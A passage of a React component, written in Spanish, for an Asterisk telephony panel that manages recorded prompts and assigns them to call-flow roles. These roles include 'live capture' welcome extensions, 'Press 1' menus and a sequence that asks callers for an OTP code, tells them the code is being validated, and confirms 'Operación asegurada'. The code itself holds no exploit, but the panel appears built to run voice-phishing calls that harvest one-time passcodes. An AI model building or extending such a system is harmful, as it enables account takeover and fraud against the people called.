                assignedRoles.length > 0
                  ? 'bg-slate-900 border-emerald-500/40 shadow-md'
                  : 'bg-slate-900 border-slate-800 hover:border-slate-700'
              }`}
            >
              <div>
                {/* Card Header & Category Badge */}
                <div className="flex items-start justify-between gap-2 mb-2">
                  <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full border ${cat.color}`}>
                    {cat.label}
                  </span>
                  <button
                    onClick={() => onDeleteAudio(audio.id)}
                    className="p-1 rounded text-slate-500 hover:text-rose-400 hover:bg-slate-800 transition-colors"
                    title="Eliminar audio de la biblioteca"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>

                <h3 className="font-semibold text-white text-sm leading-snug">{audio.name}</h3>
                <p className="text-xs text-slate-400 font-mono mt-0.5">{audio.fileName}</p>

                {/* Active in Roles Badge */}
                {assignedRoles.length > 0 && (
                  <div className="mt-2 flex items-center gap-1.5 flex-wrap">
                    <span className="text-[10px] text-emerald-400 font-semibold">Activo en:</span>
                    {assignedRoles.map((r) => {
                      const rConf = SYSTEM_ROLES.find((sr) => sr.role === r);
                      return (
                        <span
                          key={r}
                          className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 flex items-center gap-1"
                        >
                          <span>✓</span>
                          <span>{rConf?.badge || r}</span>
                        </span>
                      );
                    })}
                  </div>
                )}
              </div>

              {/* Audio Player & Waveform simulation */}
              <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
                <div className="flex items-center justify-between">
                  <button
                    onClick={() => handlePlayToggle(audio)}
                    className={`p-2 rounded-full flex items-center justify-center transition-all ${
                      isPlaying
                        ? 'bg-emerald-500 text-black shadow-md shadow-emerald-500/30 animate-pulse'
                        : 'bg-slate-800 text-white hover:bg-slate-700'
                    }`}
                    title={isPlaying ? 'Pausar' : 'Reproducir locución'}
                  >
                    {isPlaying ? <Pause className="w-4 h-4" /> : <Play className="w-4 h-4 ml-0.5" />}
                  </button>

                  <div className="flex-1 px-3">
                    <div className="flex items-center gap-0.5 h-6">
                      {[40, 75, 50, 90, 60, 30, 85, 45, 95, 70, 50, 80, 65, 35, 75, 55, 90, 40].map(
                        (height, idx) => (
                          <div
                            key={idx}
                            className={`flex-1 rounded-full transition-all ${
                              isPlaying ? 'bg-emerald-400 animate-pulse' : 'bg-slate-700'
                            }`}
                            style={{ height: `${isPlaying ? height : Math.max(20, height * 0.5)}%` }}
                          ></div>
                        )
                      )}
                    </div>
                  </div>

                  <span className="text-xs font-mono font-medium text-slate-400">
                    {audio.durationSec}s
                  </span>
                </div>

                {/* File Specs */}
                <div className="flex justify-between text-[11px] text-slate-400 font-mono pt-1 border-t border-slate-800/80">
                  <span>{audio.fileSize}</span>
                  <span className="truncate max-w-[170px]">{audio.sampleRate}</span>
                </div>
              </div>

              {/* Dialplan / Asterisk Path Reference */}
              <div className="text-[11px] bg-slate-950/60 p-2 rounded border border-slate-800 flex items-center justify-between text-slate-300 font-mono">
                <span className="text-slate-400">Playback({audio.asteriskPath})</span>
                <button
                  onClick={() => copyToClipboard(`Playback(${audio.asteriskPath})`)}
                  className="text-slate-400 hover:text-emerald-400 p-0.5"
                  title="Copiar sintaxis para extensions.conf"
                >
                  <Copy className="w-3.5 h-3.5" />
                </button>
              </div>

              {/* Action Assignment buttons (1-Click Change) */}
              <div className="pt-2 border-t border-slate-800 space-y-1.5">
                <span className="text-[10px] text-slate-400 font-medium block">Asignar en 1 clic como:</span>
                <div className="flex items-center gap-1.5 flex-wrap">
                  <button
                    onClick={() => {
                      if (activeAssignments.welcome_7777 === audio.asteriskPath) {
                        handleDeactivateRole('welcome_7777');
                      } else {
                        handleAssignRoleDirect('welcome_7777', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.welcome_7777 === audio.asteriskPath
                        ? 'bg-purple-500 text-white font-bold shadow-sm shadow-purple-500/20 hover:bg-purple-600'
                        : 'bg-purple-500/10 text-purple-300 border border-purple-500/20 hover:bg-purple-500/20'
                    }`}
                    title={activeAssignments.welcome_7777 === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida de la extensión 7777"}
                  >
                    <Sparkles className="w-3 h-3" />
                    <span>Ext 7777</span>
                    {activeAssignments.welcome_7777 === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.welcome_6666 === audio.asteriskPath) {
                        handleDeactivateRole('welcome_6666');
                      } else {
                        handleAssignRoleDirect('welcome_6666', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.welcome_6666 === audio.asteriskPath
                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20 hover:bg-cyan-600'
                        : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
                    }`}
                    title={activeAssignments.welcome_6666 === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida de la extensión 6666"}
                  >
                    <Sparkles className="w-3 h-3 text-cyan-300" />
                    <span>Ext 6666</span>
                    {activeAssignments.welcome_6666 === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.press1_welcome === audio.asteriskPath) {
                        handleDeactivateRole('press1_welcome');
                      } else {
                        handleAssignRoleDirect('press1_welcome', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.press1_welcome === audio.asteriskPath
                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20 hover:bg-emerald-600'
                        : 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20'
                    }`}
                    title={activeAssignments.press1_welcome === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida inicial de Press 1"}
                  >
                    <span>Intro Press 1</span>
                    {activeAssignments.press1_welcome === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.agent_transfer === audio.asteriskPath) {
                        handleDeactivateRole('agent_transfer');
                      } else {
                        handleAssignRoleDirect('agent_transfer', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.agent_transfer === audio.asteriskPath
                        ? 'bg-amber-500 text-black font-bold shadow-sm shadow-amber-500/20 hover:bg-amber-600'
                        : 'bg-amber-500/10 text-amber-300 border border-amber-500/20 hover:bg-amber-500/20'
                    }`}
                    title={activeAssignments.agent_transfer === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar a la transferencia hacia el asesor (al pulsar 1)"}
                  >
                    <span>Asesor (1)</span>
                    {activeAssignments.agent_transfer === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.otp_welcome === audio.asteriskPath) {
                        handleDeactivateRole('otp_welcome');
                      } else {
                        handleAssignRoleDirect('otp_welcome', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.otp_welcome === audio.asteriskPath
                        ? 'bg-blue-500 text-white font-bold shadow-sm shadow-blue-500/20 hover:bg-blue-600'
                        : 'bg-blue-500/10 text-blue-300 border border-blue-500/20 hover:bg-blue-500/20'
                    }`}
                    title={activeAssignments.otp_welcome === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como locución de solicitud de código OTP"}
                  >
                    <span>Pedir OTP</span>
                    {activeAssignments.otp_welcome === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.otp_wait === audio.asteriskPath) {
                        handleDeactivateRole('otp_wait');
                      } else {
                        handleAssignRoleDirect('otp_wait', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.otp_wait === audio.asteriskPath
                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20 hover:bg-cyan-600'
                        : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
                    }`}
                    title={activeAssignments.otp_wait === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio en espera durante la validación del código"}
                  >
                    <span>Espera OTP</span>
                    {activeAssignments.otp_wait === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.otp_success === audio.asteriskPath) {
                        handleDeactivateRole('otp_success');
                      } else {
                        handleAssignRoleDirect('otp_success', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.otp_success === audio.asteriskPath
                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20 hover:bg-emerald-600'
                        : 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20'
                    }`}
                    title={activeAssignments.otp_success === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio de código validado con éxito"}
                  >
                    <span>Éxito</span>
                    {activeAssignments.otp_success === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.otp_failure === audio.asteriskPath) {
                        handleDeactivateRole('otp_failure');
                      } else {
                        handleAssignRoleDirect('otp_failure', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.otp_failure === audio.asteriskPath
                        ? 'bg-rose-500 text-white font-bold shadow-sm shadow-rose-500/20 hover:bg-rose-600'
                        : 'bg-rose-500/10 text-rose-300 border border-rose-500/20 hover:bg-rose-500/20'
                    }`}
                    title={activeAssignments.otp_failure === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio de código inválido / reintento"}
                  >
                    <span>Fallo</span>
                    {activeAssignments.otp_failure === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Modal: Confirmación de subida y metadatos del audio */}
      {isUploadModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-xl bg-slate-900 border border-slate-800 p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <h3 className="text-lg font-bold text-white flex items-center gap-2">
                <Volume2 className="w-5 h-5 text-emerald-400" />
                <span>Registrar Audio en Asterisk</span>
              </h3>
              <button
                onClick={() => setIsUploadModalOpen(false)}
                className="text-slate-400 hover:text-white text-lg font-mono"
              >
                &times;
              </button>
            </div>

            <form onSubmit={handleSaveAudio} className="space-y-4 text-xs">
              <div>
                <label className="block text-slate-300 font-medium mb-1">
                  Nombre descriptivo del audio *
                </label>
                <input
                  type="text"
                  required
                  value={newAudioName}
                  onChange={(e) => setNewAudioName(e.target.value)}
                  placeholder="Ej: Bienvenida Campaña Cobranzas"
                  className="w-full px-3 py-2 rounded-md bg-slate-950 border border-slate-800 text-white focus:border-emerald-500 focus:outline-none text-xs"
                />
              </div>

              <div>
                <label className="block text-slate-300 font-medium mb-1">
                  Mensaje o Rol en la Central Telefónica
                </label>
                <select
                  value={newAudioCategory}
                  onChange={(e) => setNewAudioCategory(e.target.value as AudioPrompt['category'])}
                  className="w-full px-3 py-2 rounded-md bg-slate-950 border border-slate-800 text-white focus:border-emerald-500 focus:outline-none text-xs"
                >
                  <option value="welcome_7777">Bienvenida Extensión 7777 (Captura en Vivo)</option>
                  <option value="welcome_6666">Bienvenida Extensión 6666 (Captura en Vivo)</option>
                  <option value="welcome_5555">Bienvenida Extensión 5555 (Captura en Vivo)</option>
                  <option value="welcome_4444">Bienvenida Extensión 4444 (Captura en Vivo)</option>
                  <option value="welcome_3333">Bienvenida Extensión 3333 (Captura en Vivo)</option>
                  <option value="press1_welcome">Bienvenida IVR Press 1 (Al contestar llamada)</option>
                  <option value="agent_transfer">Transferencia a Asesor ("Un momento por favor...")</option>
                  <option value="press1_invalid">Opción Inválida en Menú Press 1</option>
                  <option value="otp_welcome">Solicitud Dígitos OTP ("Ingrese su código...")</option>
                  <option value="otp_wait">Validación en Espera ("Validando información...")</option>
                  <option value="otp_success">Validación Correcta ("Operación asegurada")</option>
                  <option value="otp_failure">Código Inválido ("Token incorrecto, reintente")</option>
                  <option value="hold_music">Música en Espera (MOH)</option>
                  <option value="custom">Anuncio / General</option>
                </select>
              </div>

              {/* Auto activate checkbox */}
              {newAudioCategory !== 'custom' && newAudioCategory !== 'hold_music' && (
                <label className="flex items-center gap-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={autoActivateRole}
                    onChange={(e) => setAutoActivateRole(e.target.checked)}
                    className="rounded border-slate-700 text-emerald-500 focus:ring-0"
                  />
                  <span className="text-emerald-300 text-[11px] font-medium">
                    Activar inmediatamente como el audio en vivo para este rol en Asterisk
                  </span>
                </label>
              )}

              <div className="p-3 rounded bg-slate-950 border border-slate-800 text-slate-400 space-y-1">
                <div className="flex justify-between">
                  <span>Archivo:</span>
                  <span className="font-mono text-slate-200 truncate max-w-[200px]">{stagedFileName}</span>
                </div>
                <div className="flex justify-between">
                  <span>Tamaño:</span>
                  <span className="font-mono text-slate-200">{stagedFileSize}</span>
                </div>
                <div className="flex justify-between">
                  <span>Duración estimada:</span>
                  <span className="font-mono text-emerald-300">{stagedDuration} segundos</span>
                </div>
              </div>

              <div className="p-2.5 rounded bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 text-[11px]">
                💡 El servidor convertirá automáticamente este archivo a <strong>8000Hz 16-bit Mono PCM</strong> y lo guardará en <code className="font-mono">/var/lib/asterisk/sounds/custom/</code>.
              </div>

              <div className="flex justify-end space-x-2 pt-2 border-t border-slate-800">
                <button
                  type="button"
                  onClick={() => setIsUploadModalOpen(false)}
                  className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-bold"
                >
                  Guardar y Sincronizar
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
